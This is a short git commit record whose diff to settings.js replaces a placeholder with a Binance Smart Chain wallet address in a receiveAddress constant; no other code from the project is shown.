10bb14b7fb6ba94ee11878fc459c01d35b34db60
hxig <158146327+hxig@users.noreply.github.com>
2024-01-30 14:20:36 +0530

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x463E28F5C136F0eEE7f14c78f4AC81f609faB70C";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
